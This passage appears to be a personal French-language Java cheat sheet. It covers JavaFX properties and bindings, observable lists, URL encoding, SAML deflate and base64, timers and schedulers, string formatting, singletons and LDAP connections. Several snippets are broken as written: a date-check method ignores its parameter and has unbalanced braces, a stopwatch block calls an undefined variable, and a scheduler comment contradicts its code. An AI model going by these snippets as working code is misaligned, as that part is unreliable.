	                droiteFillAnimation.setToValue(!isOn ? Color.web("#1780af",1.0): Color.WHITE);

	                animation.play(); // l'annimation se joue
	            });

	            setOnMouseClicked(event -> {
	                switchedOn.set(!switchedOn.get());
	            });
	        }
	    }
	}

1) FXProperties fx properties Objets : edition modifier champ modification formulaire en proprietes jfx : javafx : Bind et listner ne marchent que si tout est dans le même thread
                                     Observable  ObservableValue                                                                
                pourInvalidListner__|      \    /              |_pour les changeListener                                      
                                        ReadOnlyXXXProperty                                                                   
                                            |                                                                                 
                      Classes abstraites  XXXProperty       getValue()=get(),setValue()=set()                           
                                            |                                                                           
                      Wrappers         SimpleXXXProperty    .bind(ObservableValue) ou .addListener(@fonctionnalInterface) @fi=InvalidationListener(param=Observable) ou ChangeListner(param=ObservableValue). syntaxe:addListener((ChangeListener<? super String>)( ObservableValue,oldvalue,newval)->{boxText.setText(newval);})
                                        XXX=String,Boolean,Object(pour primitifs ou classes)  Map List Set et aussi   Double,Float,Long,Integer,// Attention si chiffre alors on utilise Observable(Value)<NUMBER!> et non pas <Integer> par exemple
                                        MACLASSE contient
                                              final XXXProperty<MonChamp> monchamp = new SimpleXXXProperty(MACLASSE.this, unString, valeurInitiale) // toujours final:interdit d'overrider 
                                            	final    MonChamp getMonChamp(){ return monchamp.get[Value]();} setMonchamp(pmonchamp){ monchamp.set[Value](pmonchamp);}
                                              pasfinal [ReadOnly]xxxProperty monchampProperty(){return monchamp;}
                                                          |_dans ce cas setMonchamp doit etre private
                    uneproprieteChangeSiLAutreChange: biding uni ou bidirectionelle(les deux proprietes s'ecoutent mutuellement) ATTENTION uneProp ne peut .bind qu'1 seule autre Prop. Donc voir LINKbindseveral si besoin
                      |_Du coup exception si est settee par ailleurs. Besoin de unbinder d'abord si on a besoin de la setter
LINKbindseveral :   -FluentAPI: String Expression et ObjectExpression et BooleanExpression et NumberExpression.add(x).and(y).isEqualTo(z).length().etc etc du coup on passe par ça pour qu'une propriete soit bindé à plusieurs autres exemple: prop.bind(uneautreprop.isEmpty().or(une3eprop.estTruc())
                    -FactoryMethods que methodes statiques: unepropriete.bind(Bindings.concat("x",unePropriete,Binding.size(uneprop)).asString().when(...
                                                                    p.bind(Bindings.createXBinding(()->{formatage,laprop1QueJecoute,laprop2QueJecoute,...}));
                                                                    pText.bind(Bindings.createStringBinding(()->{leFormatage,laprop1QueJecoute,laprop2QueJecoute,...}
                                                                equivalent à ci dessous qui est plus verbeux                                                                    
                    -CustomBindings : p_ecouteur.bind(new XBinding(){ 
                                                                super.bind(p_ecouté1,p_ecouté2,p_ecouté3......);
                                                                @Override
                                                                X computeValue(){...}           
                                                            }
2) FXProperties listes : 
    SimpleListProperty contient ObservableList qui est crée par FXCollections.observableArrayList();
    donc on initialiser comme ça: final ListProperty<SimpleBean> childrens = new SimpleListProperty<>(FXCollections.observableArrayList());
                                    |_pour effacer vider empty faire .clear()
Abstract: ObservableList<E> maliste = FXCollections.observableArrayList(); ou (unearray ou extractor) // extractor est une @functionnalInterface si on veut ecouter les updates des elements de la liste. LINKmajdansElementdeliste  
Wrapper:                |_ SortedList<E> ou FilteredList<E> toto = new xxxunObservableList(@FunctionalInterface)   //unObservableList peut etre maliste ou meme un autre filtered ou sortedlistList<>()                         
                                             |                 |                                     |_pour filtrer(predicate) ou pour trier(comparator)->change la liste automatiquement et peut donc declancher un Listner. voir ci dessous
                              attention remplace               |_.addListener(@FunctionalInterface) //de l'interface ListChangeListener<E>.onChanged(Change) syntaxe:(ListChangeListener<SimpleBean>)c->{ // capte les evenements des elements de la liste:sorted, add,delete,(pour update voir LINKmajdansElementdeliste parametres paramettres des objets)
                              un event d'update                |_on met ça dans un tableView.setItem(toto);                                                |_while(change.next()){
                              par un event de add/delete         et ça se met à jour tout seul                                                                if(change.wasUpdated()){} // Uniquement si LINKmajdansElementdeliste   
                              voir LINKmajdansElementdeliste                                                                                                  if(change.wasRemoved()){}
                                                                                                                                                                }
    pour cloner une observableList c'est facile:LINKCloner         nouvelArrayindependante= FXCollections.observableArrayList(uneObservableList)); avec les fxproperties ne pas utiliser le clonage avec serialisation. plutot avec la methode constructeur. Encore mieux :voir LINKlkgkgkhgkfdlkjfglk                                                                                                                                                                 
si on utilise lambda stream pour recuperer l'observableList faire stream....collect(Collectors.toCollection(FXCollections::observableArrayList));                                                                                                                                                                
LINKmajdansElementdeliste le callback de l'extractor retourne un tableau de Observable qui sont les proprietes que je veux observer de chaque elements de ma liste. On peut s'en passer en ecoutant seulement les removes et adds
                        pour que ça marche donc faire :ListProperty<SimpleBean> childrens = new SimpleListProperty<>(FXCollections.observableArrayList(simplebean->new ObservableValue[]{simplebean.unChampAObserver()}));                                                                             

java6 :
http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase6-419409.html 
java7 :
http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html  
JAVA :
recuperer un fichier selon son path relative relatif et non pas absolu : 
        grace à System.getProperty("user.dir") qui est toujours dispo.
        File defaultBusinessDir = new File(System.getProperty("user.dir"), "/src/main/resources/data/business") ; 
 bean couple paire tuple deux :
        utiliser AbstractMap.SimpleEntry ou bien faire la classe
        public class Tuple<X, Y>
                  {
                      private X x;
                      private Y y;
                      public Tuple()
                      {
                      }
                      public Tuple(X x, Y y) {
                          this.x = x;
                          this.y = y;}
                      public X getX()
                      {
                          return x;
                      }
                      public Y getY()
                      {
                          return y;
                      }
                      public void setX(X x)
                      {
                          this.x = x;
                      }
                      public void setY(Y y)
                      {
                          this.y = y;
                      }
                      @Override
                      public String toString()
                      {
                          return (this.x==null?"":x.toString())+"->"+(this.y==null?"":y.toString());
                      }
                  }
 du code java pour aller sur une autre page sans rien faire de special
  res.setContentType("text/html");
  res.setHeader("pragma", "no-cache");
  ServletOutputStream out = res.getOutputStream();
  TemplateContext context = new ProxyBundle();
  context.setOutputStream(out);
  getPage("html.docIntrouvable").print(context);
  out.close();
convertir mp3 en wave : 
    utiliser 
    tritonus-share-0.3.7-2.jar
    mp3spi-1.9.5-1.jar
    jorbis-0.0.17-2.jar
    jlayer-1.0.1-1.jar
    vorbisspi-1.0.3-1.jar
            <dependency><groupId>com.googlecode.soundlibs</groupId><artifactId>tritonus-share</artifactId><version>0.3.7-2</version></dependency>
        <dependency><groupId>com.googlecode.soundlibs</groupId><artifactId>jlayer</artifactId><version>1.0.1-1</version></dependency>
        <dependency><groupId>com.googlecode.soundlibs</groupId><artifactId>mp3spi</artifactId><version>1.9.5-1</version></dependency>
        <dependency><groupId>com.googlecode.soundlibs</groupId><artifactId>jorbis</artifactId><version>0.0.17-2</version></dependency>
        <dependency><groupId>com.googlecode.soundlibs</groupId><artifactId>vorbisspi</artifactId><version>1.0.3-1</version></dependency>
delta entre deux chaines de caracteres characters strings :
         public static String[] difference(String a, String b) {
                return diffHelper(a, b, new HashMap<>());
            }
            private static String[] diffHelper(String a, String b, Map<Long, String[]> lookup) {
                return lookup.computeIfAbsent(((long) a.length()) << 32 | b.length(), k -> {
                    if (a.isEmpty() || b.isEmpty()) {
                        return new String[]{a, b};
                    } else if (a.charAt(0) == b.charAt(0)) {
                        return diffHelper(a.substring(1), b.substring(1), lookup);
                    } else {
                        String[] aa = diffHelper(a.substring(1), b, lookup);
                        String[] bb = diffHelper(a, b.substring(1), lookup);
                        if (aa[0].length() + aa[1].length() < bb[0].length() + bb[1].length()) {
                            return new String[]{a.charAt(0) + aa[0], aa[1]};
                        } else {
                            return new String[]{bb[0], b.charAt(0) + bb[1]};
                        }
                    }
                });
            }
pour ajouter des elements à un tableau de type [] passer par des Arrays.
si j'ai erreur 
      java.lang.AbstractMethodError c'est peut etre parce que j'ai mis un @override alors qu'il n'y a pas de raison.(peut etre)
si j'ai erreur Error:java: exporting a package from system module java.instrument is not allowed with --release
    Maven : maven-compiler-plugin passer à la bonne version (8->9->10)
  LINK_URLENCODEDECODE  quand un string contient des pourcentages % a cause de l'URI
    url encoder :
          en java faire : user = (java.net.)URLEncoder.encode(user, "UTF-8");
          ou bien 
                      public static char[] encodeURL(String str) throws UnsupportedEncodingException {
                    char[] temp = URLEncoder.encode(str, "UTF-8").toCharArray();
                    for (int i = 0; i < temp.length; i++) {
                        if (temp[i] == '%') {
                            temp[i + 1] = Character.toLowerCase(temp[i + 1]);
                            temp[i + 2] = Character.toLowerCase(temp[i + 2]);
                        }
                    }
                    return temp;
                }
    url decoder : 
    java.net.URLDecoder.decode(url, "UTF-8");
    
pour deflateandencode : 
      import java.util.zip.Deflater;
      import java.util.zip.DeflaterOutputStream;
      import org.apache.commons.codec.binary.Base64; de <dependency><groupId>commons-codec</groupId><artifactId>commons-codec</artifactId><version>1.10</version></dependency>// ou org.opensaml.xml.util.Base64...
      public static String deflateAndEncodeBase64(String samlRequest) throws IOException {
            // Deflate the SAMLResponse value
            ByteArrayOutputStream bytesOut = new ByteArrayOutputStream();
            Deflater deflater = new Deflater(Deflater.DEFLATED, true);
            DeflaterOutputStream deflaterStream = new DeflaterOutputStream(
                    bytesOut, deflater);
            deflaterStream.write(samlRequest.getBytes());
            deflaterStream.finish();

            // Encoded the deflatedResponse in base64
            Base64 base64encoder = new Base64();
            String base64response = new String(base64encoder.encode(bytesOut.toByteArray()), "UTF-8");
            return base64response;
        }
        // sinon: mais bof n'utilise pas de string
       Deflater deflater = new Deflater(Deflater.DEFLATED, true);
            DeflaterOutputStream deflaterStream = new DeflaterOutputStream(bytesOut, deflater);
            deflaterStream.write(messageStr.getBytes());
            deflaterStream.finish();
        String res = Base64.encodeBytes(bytesOut.toByteArray(), Base64.DONT_BREAK_LINES);

  pour savoir si mon java est en 32bits ou 64bits
      path/vers/java/java -d64 -version
  mettre dans methode statique static main inner class qu'on execute:
        public class MetadataDownloader {
            	public static void main(String[] args) {
            		ProcessDownload process = new MetadataDownloader().getProcessDownload();
            		process.downloadFile();
            	}
            	public ProcessDownload getProcessDownload(){
            	return new ProcessDownload();
            }
            	public class ProcessDownload
            	{

		      
  logguer tracer debugger debuger les methodes appelantes : 
          	protected void printStacktrace(String label) { linkgetStringStackTrace
                      StackTraceElement[] stck = Thread.currentThread().getStackTrace();
                  StringWriter sw = new StringWriter();
              		PrintWriter pw = new PrintWriter(sw, true);
              		pw.write("PrintStackTrace "+label+": \n");
              		for (int i=0; i<stck.length; i++)
                      {
                          pw.write(stck[i].getClassName()+":"+stck[i].getMethodName()+"\n");
                      }
              		pw.flush();
              		sw.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
              		logger.debug(sw.toString());
              	}
  pour savoir si c'est le premiers jour ouvre ouvrable ouvre du mois
     public boolean isFirstDayofMonth(Calendar calender){
            	Date d1 = new Date(); depuis Java8 voir LocalDateTime!!!!
            		boolean ret = true;
            		Calendar calendar = new GregorianCalendar();
            		calendar.setTime(d1);
            		if (calendar.get(Calendar.DAY_OF_MONTH)==1)
            		{
            			if (calendar.get(Calendar.DAY_OF_WEEK) == Calendar.SATURDAY || calendar.get(Calendar.DAY_OF_WEEK) == Calendar.SUNDAY) 
            			{
            				ret=false;
            			}
            		}
            		else if (!(calendar.get(Calendar.DAY_OF_WEEK) == Calendar.MONDAY && (calendar.get(Calendar.DAY_OF_MONTH)==1 || calendar.get(Calendar.DAY_OF_MONTH)==2)))
            		{
            			ret=false;
            		}
            	}
            	return ret;
        }
  pour minuter chronometrer faire des laps lors du programme temps passe duree: utiliser mesurer performances
      System.nanoTime après java 1.5 semble threadsafe
      StopWatch de spring: n'est pas threadsafe // plus bas stopwatch d'apache
      StopWatch stopwatch= new StopWatch(); ou new StopWatch(AbstractSAMLEntryPoint.class.getName()); // si je ne fais pas ça a chaque fois dans la methode il va cumuller les enregistrements meme entre plusieurs thread indépendants qui passent dans la classe
      	if (stopwatch.isRunning()) stopwatch.stop();
					stopwatch.start("setprovidersNomMethodeQuiEstExecutee");
        setProviders(providers);
        stopwatch.stop();
        stopwatch.start("initialize");
        initialize();
        stopwatch.stop();
      } finally {
    		if (stopwatch.isRunning()) sw.stop();
    		log.debug("AUDIT1: "+stopwatch.prettyPrint()); // encore : mieux: fait un rapport de ouf
        ou 
        logger.info(stopwatch.toString()); 
      stomwatch d'apache: sais pas si c'est threadsafe
            StopWatch stopwatch= new StopWatch(); 
        		stopwatch.start();
        		String[] res=new String[100];
        				for (int i=0; i<2000; i++)
        				{
      	  			res = UtilitaireChaines.decouperLignePivotAvecSeparateur("a;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;ba;;sdf;;sdfsdf;;;qsdqsd;ba;;;;;sdfsdf;;;ba;dg;;;d;;;dsf;ba;;;sdfsdf;;;sdfs;;ba;;dfs;;;dsfsf;;;ba;;;qsdqdqsd;;;;;ba;;sdfs;;;;;;ba;;;;;;;;ba;;;;;sfs;;;b", ";");
        				}
      	  		     System.out.println(res.length);
                stopwatch.stop();
                System.out.println(stopwatch.toString());
                stopwatch.reset();
                stopwatch.start();

		}
		
      log(sw.getTotalTimeMillis());
  //TODO: //FIXME: sympa pour mettre des flags.
  pour partitionner decouper sousliste subliste une liste en liste de liste d'objets à traiter par blocs :
        List<IHRKey> hrKeys = new ArrayList<IHRKey>();
        ...                         
        List<List<IHRKey>> hrKeysPartitions = MyPartition.partition(hrKeys, 20); // 20 taille des blocs
                                          public class MyPartition {
                            	public static <T> List<List<T>> partition(List<T> list, int size) {
                            		if (list == null)
                            			throw new NullPointerException("'list' must not be null");
                            		if (!(size > 0))
                            			throw new IllegalArgumentException("'size' must be greater than 0");
                            		return new Partition<T>(list, size);
                            	}
                            	private static class Partition<T> extends AbstractList<List<T>> { // si erreur There is no default constructor available in dans la methode je dois faire super(xxx)
                            		final List<T> list;
                            		final int size;
                            		Partition(List<T> list, int size) {
                            			this.list = list;
                            			this.size = size;
                            		}
                            		@Override
                            		public List<T> get(int index) {
                            			int listSize = size();
                            			if (listSize < 0)
                            				throw new IllegalArgumentException("negative size: " + listSize);
                            			if (index < 0)
                            				throw new IndexOutOfBoundsException("index " + index
                            						+ " must not be negative");
                            			if (index >= listSize)
                            				throw new IndexOutOfBoundsException("index " + index
                            						+ " must be less than size " + listSize);
                            			int start = index * size;
                            			int end = Math.min(start + size, list.size());
                            			return list.subList(start, end);
                            		}
                            		@Override
                            		public int size() {
                            			return (list.size() + size - 1) / size;
                            		}
                            		@Override
                            		public boolean isEmpty() {
                            			return list.isEmpty();
                            		}
                            	}
                            }
  
      pour savoir si un string est vide empty, ou null:
              org.apache.commons.lang.StringUtils.isEmpty(this.url_redirect)
        pour faire un prog qui s'execute regulierement: (sinon voir l'API quartz permet plus d'options) LINKTimersdkjsq
          depuis java 1.5:
          ScheduledExecutorService:
              avantages:
              utilise un pool de threads, ce qui ameliore les performances notamment dans le cas de l'execution en parallèle de plusieurs tâches
              les delais peuvent être precises avec plusieurs unites
              les tâches à executer n'ont plus besoin d'heriter de la classe TimerTask
                          public class Execute {
                          public static void main(String[] args) 
                          {
                            ScheduledExecutorService ses1 = new ScheduledThreadPoolExecutor(10);
                            ScheduledExecutorService ses2 = Executors.newScheduledThreadPool(10);
                
                            final Runnable maTache = new Runnable() { LINKRunnable
                                public void run() {
                                    System.out.println("Ma tache (" + Thread.currentThread().getName()+ ") " + new Date());
                                }
                            };
                            //execution regulière
                                ses2.scheduleAtFixedRate(maTache,1,2,SECONDS); // execute la premiere fois matache dans 10 sec puis toutes les fois suivantes chaque 20 sec.
                            //execution une seule fois dans le futur. maintient le thread principal en vie tant qu'il n'est pas execute
                                ScheduledFuture<String> maTacheFuture = ses1.schedule(//maTache,10,SECONDS);
                                        new Callable<String>() {
                                            public String call() throws Exception {
                                                System.out.println("Execution de la tache ("+ Thread.currentThread().getName() + ") " + new Date());
                                                return "Resultat de la tache";
                                            }
                                }, 302, SECONDS);
                                System.out.println("Autre traitement (" + Thread.currentThread().getName()+ ") " + new Date());
                                try {
                                    System.out.println("Resultat = " + maTacheFuture.get());
                                } catch (InterruptedException e) {
                                    e.printStackTrace();
                                } catch (ExecutionException e) {
                                    e.printStackTrace();
                                }
                                ses1.shutdown();
                                ses2.shutdown();
                            }
                        }
               
        depuis java 1.3 (old)
        timer:   utilisation du timer : (thread) faire un schedule execution reguliaire automatique LINKTimersdkjsq
        inconveniants:
          pas de planification complexe
          execution d'une seule tâche à la fois
          pas de persistance des planifications et des tâches  
          schedule et scheduleatfixedrate: (fixedrate rattrape vite le temps perdu)
          Log.d("timer", "ccccccccccccccc"+total.setScale(5,BigDecimal.ROUND_DOWN).divide(new BigDecimal(nbmeasure),4, RoundingMode.HALF_UP));
        public void onCreate() 
           {  
              timer = new Timer();
              //schedule et scheduleatfixedrate: (fixedrate rattrape vite le temps perdu)
              timet = new TimerTask() ou new UneClasseQuiEtendTimerTask() 
              {
                @Override
                public void run() 
                {
                  ...
                }
              };
        public void onStart(Intent intent, int startId) { 
             timer.schedule(timet, Integer.parseInt(params[0].trim())*1000, Integer.parseInt(params[0].trim())*1000);
              ou
              new Timer(true).schedule(timet, Integer.parseInt(params[0].trim())*1000, Integer.parseInt(params[0].trim())*1000);
        }
          public void onDestroy() {
                   		timet.cancel();
                   		timer.purge();
                  		timer.cancel();
                   		super.onDestroy();
        	}
       methode bof: pour faire un minuteur qui ne bouffe pas toute la memoire: temps (ne jamais mettre un controlleur dans un thread) 
                    public void run() 
                	  {
                		long start = System.currentTimeMillis();
                		// pour s'assurer que le thread tourne
                		   while( mp.isPlaying()) 
                		    {
                          ...
                          if (((System.currentTimeMillis() -start)%100)==0)
                			   {
                					...
                			   }
                		    }
                		}
          ou bien par crontab qui execute .sh qui execute .java .jar:
            crontab: 
            30 23 * * * /opt/hnbas/metadatadownloader/metadatadownloader.sh 
            sh:
            #!/bin/bash
                PATH=/usr/java/jdk1.7.0_51/bin:/usr/lib64/qt-3.3/bin:/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/opt/puppetlabs/bin
                java -DpropertiesFullpath=/opt/hnbas/metadatadownloader/metadatadownloader.properties -jar MetadataDownloader-0.0.1.jar
si j'ai erreur "java.nio.file.InvalidPathException: Trailing char < > at index 33: ImportFileForImportUnitTests.xlsx "
    c'est peut etre parce que j'ai un espace dans le nom de mon fichier que je donne dans le programme java. Interdit.
pour formater une chaine de caractères (mapper convertir fichier)
pour faire un message avec des {0}{1}{2}...  qui sont remplace par des strings: (utilisable comme moteur de template?) 
  Utiliser MessageFormat (pour echaper escape des accolades brackets brakets les entourer de signe quote ')
  exemple: 
        Object[] arguments = {new Integer(7),new Date(System.currentTimeMillis()),"a disturbance in the Force"};
          String result = MessageFormat.format("At {0,time} on {1,date}, there was {2} on planet {0,number,integer}.", arguments);
          // attention si notre string qui contient les marqueurs a des single quotes guillement ca ne marche pas!! il faut les remplacer par des doubles single quotes (echappement)
          output: At 12:30 PM on Jul 3, 2053, there was a disturbance in the Force on planet 7.
          ou
          MessageFormat form= new MessageFormat(  "The disk \"{1}\" contains {0} file(s).");
          String result = form.format(arguments);
ou bien 
   String toto = String.format("%4$-5S(PASDESPACEICI)%3$2s(PASDESPACEICI)%2$2s(PASDESPACEICI)%1$2s", "a","b","c","dd"); //%argumentNumeroCommenceParUn$-tailleMinARespecterAjouteEspaceSiPlusPetit (si l'argument est plus grand que -xS il ne le tronque pas) S ou s pour la casse
   retourne DD     c  b  a                                                                                   |                                                                               |
   exemple :                                                                                                 (-): les espaces sont a droite. si rien les espaces sont a gauche                x doit etre superieur à 0 mais le nombre d'espace visible sera x+1 donc je dois mettre nombreDespaceVoulu-1 
   logger.warn("User "+String.format("%s %s %s", tPrincipal.getNom(),tPrincipal.getLogin(),tPrincipal.getEmail())+ "in webservice has no roles");
   retourne a b bc
        permet aussi d'afficher en millions milliards un chiffre voir LINKStringFOrmatNumb
singleton : dès java 7, 8(je crois)
         est threadsafe: (donc il est implicitement volatile non?)
         public class Singleton
          {		
          	/** Constructeur prive */	
          	private Singleton()
          	{
            initialisation unique
            }
             public String unChamp;
          	/** Holder */
          	private static class SingletonHolder
          	{		
          		/** Instance unique non preinitialisee */
          		private final static Singleton instance = new Singleton();
          	}
           
          	/** Point d'accès pour l'instance unique du singleton */
          	public static Singleton getInstance()
          	{
          		return SingletonHolder.instance;
          	}
          }
           
definition threadsafe thread safe :
    si threadsafe : ca peut etre un singleton et plusieurs thread l'atteingnent
    si non thread safe il ne faut pas que ce soit un singleton: il doit etre instancie a chaque fois par un thread
    
  UnknownHostException
    peut etre qu'il faut rajouter les parametres pour qu'il attaque le proxy (sur tomcat à mettre dans setup.sh) 
      # Specifique AUCHAN pour SSO CAS (mettre les -D avant le -jar si j'execute un programme. Sur tomcat ceci se met dans setenv.sh)
        JAVA_OPTS="$JAVA_OPTS"" -Dhttps.proxyHost=FRSOPSLINFV01"
        JAVA_OPTS="$JAVA_OPTS"" -Dhttps.proxyPort=8080"

javaUnsupported major.minor version 51.0
    c parce que je run en java <7 un programme compile en >=7
      Java SE 8 = 52 (0x34 hex)
      Java SE 7 = 51 (0x33 hex)
      Java SE 6.0 = 50 (0x32 hex)
      Java SE 5.0 = 49 (0x31 hex)
immutable : objet ne pouvant pas etre modifie apres l'avoir cree : c mieux de faire un update sur des objets mutables car ca consomme moins que si on recree de nouveaux objets immutables. Mais c'est threadsafe de travailler avec des immutable donc si pas d'updates prevus: mettre final sur les proprietes de mon objet pour qu'il soit immutable
les objets statiques sont partages par tous les objets dans la jvm à conditions que les programmes utilisent le meme classloader dans la jvm
recuperer une variable d'environnement en java:
    System.getenv("lavariable"); // recupere une variable d'environnement settee sur la machine (unix...windows?)voir LINK4488
au lieu de faire un if pour les conditions d'executions, mettre Assertion.isTrue() c'est plus rapide: si c pas verifie ca renvoie erreur direct.                                                              
pour se connecter à un LDAP : voir exemple projet D:\RD\LdapTestConnexion\src\main\java\TestLdapConnexion.java
               		Hashtable<String, String> env = new Hashtable<String, String>();
                      env.put(Context.INITIAL_CONTEXT_FACTORY, contextFactoryClassName); //INITIAL_CONTEXT_FACTORY=java.naming.factory.initial ET contextFactoryClassName="com.sun.jndi.ldap.LdapCtxFactory"
                      env.put(Context.PROVIDER_URL, ldapUrl); // ldap(s)://blabla:port (mettre port :636 si c'est du ldaps)
                      env.put("java.naming.ldap.version","2" ou "3");
                      // locate keystore file  Specify SSL voir pour faire du ldaps
                      if (url.startsWith("ldaps:")) {
                      Methode 1: (est generique) LINKAAKJDLKIHE // locate truststore file
                        System.setProperty("javax.net.ssl.trustStore", keyStore); //besoin si Moi client appel serveur par https. le trustore m'a ete donne par le serveur distant.
                                                                      "C:/toto/soncertif.jks"); // ne mettre que un jks. Un .cer ça ne marche pas //besoin si Moi client appel serveur par https. le trustore m'a ete donne par le serveur distant (ou je l'ai récupéré avec le browser navigateur:un .cer encodé en base64).  Dans ce truststore qui est un jks je peux mettre autant de trusts que necessaire si je tappe plusieurs serveurs en SSL
                        System.setProperty("javax.net.ssl.trustStorePassword", this.trustStorePassword); // est facultatif pour un truststore
                  			System.setProperty("javax.net.ssl.trustStoreType", "jks"); //semble facultatif 
                  			System.setProperty("com.ibm.jsse2.overrideDefaultProtocol","TLSv12"); // si erreur si j'ai erreur java.lang.ArrayIndexOutOfBoundsException: Array index out of range: 64
                      autre methode : 
                        Properties systemSettings = System.getProperties();// recupère prop de la jvm voir LINKù*ù
                        systemSettings.put("javax.net.ssl.trustStore",TRUST_STORE_FILE_PATH); //ne mettre que un jks je crois. un .cer ça ne marche pas
                        systemSettings.put("javax.net.ssl.trustStorePassword", TRUST_STORE_ROOT_PASSWORD);
                        System.setProperties(systemSettings);
                    Methode 2:(est chirurgical)
             	                       env.put(Context.SECURITY_PROTOCOL, "ssl");
                                     env.put("java.naming.ldap.factory.socket", ManagedSSLSocketFactory.class.getName());
                                     voir LINK54636489 et mettre ici.
                    //FIN SI LDAPS
                      if (! StringUtils.isBlank(securityAuthentication)) {
                          // Sets the authentification scheme to access the directory: "simple" ou none ou ??
                          env.put(Context.SECURITY_AUTHENTICATION, securityAuthentication);
                      }
                      String principal = "cn=" + distinguishedName + "," + ldapSearchFilter;
                      env.put(Context.SECURITY_PRINCIPAL, principal); // compte ldap de service ou userquelconque ex:uid=fr-kb-horoquartz-reader,ou=applicationAccounts,o=corp.leroymerlin.com
                      if (! StringUtils.isBlank(password)) {          // permet de tester la connexion d'un utilisateur
                          // Password is available, sets the user's credentials
                          env.put(Context.SECURITY_CREDENTIALS, password);
                      }
              	        }
            PUIS             
                    pour gerer la pagination ldap voir projet eclipse apca-hrdossier-maj                              
                    // AirFrance : sur le modele du ProxyLdapAuthenticate HRv5
                      env.put(Context.REFERRAL, "ignore"); //ou follow si j'ai l'erreur javax.naming.PartialResultException: Unprocessed Continuation Reference(s); remaining name '...'???
                      try {
                       //faire une connexion ldap: 
                        InitialDirContext ou DirContext initialdircontext = new InitialDirContext(env); // il se connecte avec le compte service ci desssous: si echoue peut envoyer erreurs à catcher permet de verifier que connexion compte service fonctionne
                        //modifier les attributs update mise à jour maj .. pas encore très clair...              
                               ModificationItem amodificationitem[] = new ModificationItem[2];
                              amodificationitem[0] = new ModificationItem(3, new BasicAttribute("nomdelattribut", s1.getBytes("UTF-16LE")));
                              amodificationitem[1] = new ModificationItem(1, new BasicAttribute("nomdelattribut", s2.getBytes("UTF-16LE")));          
                              initialdircontext.modifyAttributes("CN=etc..distiguishname..", amodificationitem);
                        //rechercher recuperer les attributs
                                  Methode 1:
                                      SearchControls attributsàretourner = new SearchControls();
                                      attributsàretourner.setSearchScope(SearchControls.SUBTREE_SCOPE); // 2 ou 3
                                      attributsàretourner.setReturningAttributes(new String[] { attribut1, attribut2... }); // les attributs qu'on veut recuperer. Mettre null pour retourner tous les attributs
                                      String filter = "(&(objectclass=" + this.userClassName + ")(cn=" + userId + "))";
                                      NamingEnumeration results = initialdircontext.search(this.baseDN, filter, attributsàretourner);
                                      if (results.hasMoreElements()) 
                                      {
                                          SearchResult result = (SearchResult)results.nextElement();
                                          Attributes attributes = result.getAttributes();
                                      } 
                                  Methode 2:
                                        Attributes attributes = initialdircontext.getAttributes("CN=etc..distiguishname..", {"attribut1","attribut2"}); // attributs c'est un String[]
                        // parcourir les attributs                
                                          for (Enumeration<String> e = attributes.getIDs(); e.hasMoreElements();)
                                          ou
                                          for(NamingEnumeration e = attributes.getAll(); e.hasMore();) 
                                          {
                                          	logger.error("Debugflag9102 "+e.nextElement());
                                          	Attribute attribute = (Attribute)e.next(); // si namingenumeration
                                          }
                                          // recuperer le groupe d'un user...
                                          Attribute attribute = attributes.get("memberOf");//"memberOf" ou autre chose
                                          NamingEnumeration enumeration = attribute.getAll(); // un attribut peut contenir une liste
                                                                        ou attribute.get().toString();
                                          while (enumeration.hasMoreElements()) 
                                          {
                                              Object value = enumeration.nextElement();
                                          }
                                       }
